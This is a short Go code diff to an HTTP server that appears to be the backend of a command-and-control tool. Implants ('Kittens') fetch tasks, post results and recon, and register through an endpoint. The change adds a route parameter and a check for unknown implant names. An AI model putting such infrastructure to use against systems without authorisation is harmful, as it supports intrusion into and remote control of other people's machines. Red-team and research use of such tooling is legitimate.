@@ -54,7 +54,7 @@ func Api(config *config.Config) error {
 	front.GET(fmt.Sprintf("%s/:name", conf.GetGetEndpoint()), frontGetTask)
 	front.Static(fmt.Sprintf("/%s", conf.GetWebUpload()), fmt.Sprintf("./%s", conf.GetLocalUpload()))
 	front.POST(fmt.Sprintf("%s/:name", conf.GetPostEndpoint()), frontPostResult)
-	front.POST(conf.GetOpaqueEndpoint(), frontPostReg)
+	front.POST(fmt.Sprintf("%s/:name", conf.GetOpaqueEndpoint()), frontPostReg)
 	addr := fmt.Sprintf("%s:%d", conf.GetHost(), conf.GetPort())
 
 	//Disable log for backend
@@ -92,6 +92,12 @@ func Api(config *config.Config) error {
 // ------------------------
 func frontGetTask(c *gin.Context) {
 	name := c.Param("name")
+	_, ok := Kittens[name]
+	// If the key exists
+	if !ok {
+		c.IndentedJSON(200, "Unkown")
+		return
+	}
 	tasks = Kittens[name].Tasks
 	//take the last task
 	var t *task.Task
@@ -144,7 +150,6 @@ func frontPostResult(c *gin.Context) {
 		}
 		Kittens[name].SetRecon(r)
 	default:
-		//tasks = append(tasks, t)
 		Kittens[name].SetResult(t)
 	}
 }
